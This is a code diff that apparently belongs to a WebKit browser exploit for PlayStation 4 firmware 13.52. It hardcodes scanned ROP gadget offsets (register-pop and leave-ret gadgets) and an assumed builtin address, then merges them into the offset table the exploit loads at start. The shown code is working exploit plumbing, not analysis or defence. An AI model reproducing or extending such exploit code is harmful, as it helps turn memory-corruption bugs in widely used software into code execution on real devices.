@@ -19,7 +19,7 @@ let lengthMissStreak = 0;
 const calRetain = [];
 
 const LOG_MAX = 500;
-const BUILD_ID = "cal-20250827j";
+const BUILD_ID = "cal-20250827k";
 const CAL_ALIGN_STEP = 0x4000;
 const ELF_MAGIC = 0x464c457f;
 /** 13.52 retail test anchor — assumed correct unless cal proves otherwise */
@@ -27,6 +27,22 @@ const ASSUMED_EXPM1 = parseInt(
     (params.get("expm1") || "eb6350").replace(/^0x/i, ""),
     16
 );
+/** 13.52 retail — HW-scanned pop gadgets (2025-08-27, inlined so stale ps4_offsets.js cannot regress) */
+const HW_GADGETS_1352 = {
+    wk_POP_RDI_RET: 0x4be55,
+    wk_POP_RSI_RET: 0x7acb3,
+    wk_POP_RDX_RET: 0x30b1e9,
+    wk_POP_RCX_RET: 0xeaf246,
+    wk_POP_RAX_RET: 0x3424a,
+    wk_POP_R8_RET:  0x5d185,
+    wk_POP_R9_RET:  0x9b288b,
+    wk_LEAVE_RET:   0xf195b,
+};
+
+function merge1352Table(off) {
+    if (!off) off = {};
+    return Object.assign({}, off, HW_GADGETS_1352, { wk_expm1_builtin: ASSUMED_EXPM1 });
+}
 const BAD_READ_MAGICS = new Set([0, 0xffffffff, 0xcccccccc, 0xcdcdcdcd, 0xdeadbeef]);
 /** WebKit maps can be ~40–50MB; 2048 pages (32MB) was too short on 13.52 */
 const FIND_BASE_MAX_STEPS = parseInt(params.get("backmax") || "12288", 10);
@@ -1476,7 +1492,8 @@ async function runStart() {
     clearGadgetScanState();
 
     const detected = offsetsFor(navigator.userAgent);
-    tableOff = (offsetsForKey(detected.key || "13.52").off) || offsetsForKey("13.52").off;
+    tableOff = merge1352Table((offsetsForKey(detected.key || "13.52").off)
+        || offsetsForKey("13.52").off);
     if (params.get("restorescan") === "1") {
         try {
             const scanned = sessionStorage.getItem("wk-scanned-gadgets");
